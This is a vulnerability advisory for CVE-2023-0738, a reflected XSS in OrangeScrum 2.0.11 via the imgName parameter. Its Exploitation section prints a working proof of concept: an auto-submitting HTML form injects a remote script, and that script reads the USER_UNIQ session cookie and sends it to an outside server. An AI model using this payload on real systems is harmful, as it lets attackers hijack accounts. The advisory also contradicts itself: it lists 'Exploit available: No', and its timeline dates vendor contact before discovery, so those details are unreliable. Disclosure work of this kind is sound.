---
slug: advisories/eilish/
title: OrangeScrum 2.0.11 - Reflected XSS via imgName
authors: Carlos Bello
writer: cbello
codename: eilish
product: OrangeScrum 2.0.11
date: 2023-07-02 12:00 COT
cveid: CVE-2023-0738
severity: 7.3
description: OrangeScrum 2.0.11   -   Reflected XSS via imgName
keywords: Fluid Attacks, Security, Vulnerabilities, Orangescrum, XSS
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                      |
| --------------------- | ---------------------------------------------------- |
| **Name**              | OrangeScrum 2.0.11 - Reflected XSS via imgName       |
| **Code name**         | [Eilish](https://en.wikipedia.org/wiki/Billie_Eilish)|
| **Product**           | OrangeScrum                                          |
| **Affected versions** | 2.0.11                                               |
| **State**             | Public                                               |
| **Release Date**      | 2023-07-02                                           |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Reflected cross-site scripting (XSS)                                                                   |
| **Rule**              | [008. Reflected cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/008)|
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N                                                           |
| **CVSSv3 Base Score** | 7.3                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-0738](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0738)                          |

## Description

OrangeScrum version 2.0.11 allows an external attacker to obtain arbitrary
user accounts from the application. This is possible because the application
returns malicious user input in the response with the content-type set to
text/html.

## Vulnerability

This vulnerability occurs because the application returns malicious user input
in the response with the content-type set to text/html.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious HTML
code to an application user.

### Exploit.html

```html
<!DOCTYPE html>
<html>
    <body>
        <form action="https://retr02332bughunter.orangescrum.com/users/done_cropimage" method="POST">
            <input type="hidden" name="x-cord" value="10" />
            <input type="hidden" name="y-cord" value="10" />
            <input type="hidden" name="width" value="10" />
            <input type="hidden" name="height" value="10" />
            <input type="hidden" name="imgName" value="<script type='text/javascript' src='https://retr02332.com/exploit-utils.js'></script>"/>
        </form>
        <script>
              document.forms[0].submit();
        </script>
    </body>
</html>
```

The malicious JavaScript that we embed in the page is as follows.

### Exploit-utils.js

```js
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

let sessionCookie = `USER_UNIQ=${getCookie("USER_UNIQ")}`;

fetch("https://retr02332.com/leak?"+sessionCookie);
```

Thus, when the user clicks on the malicious link, it will send its session
cookie to the attacker's server logs.

## Evidence of exploitation

![vulnerability-orangescrum](https://user-images.githubusercontent.com/51862990/217407265-f56a41f3-b474-435a-9cd2-f6a64f0cf893.png)

<video width="835" height="505" controls>
    <source src="https://rb.gy/fxjmng"
    type="video/mp4">
    <p>POC-XSS-OrangeScrum</p>
</video>

![cookie-leak-orangescrum](https://user-images.githubusercontent.com/51862990/217407370-f2ac8827-831c-49b1-a06e-2ec0a547c2be.png)

## Our security policy

We have reserved the ID CVE-2023-0738 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: OrangeScrum 2.0.11

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Orangescrum/orangescrum/>

## Timeline

<time-lapse
  discovered="2023-07-02"
  contacted="2022-07-02"
  replied="2022-07-02"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
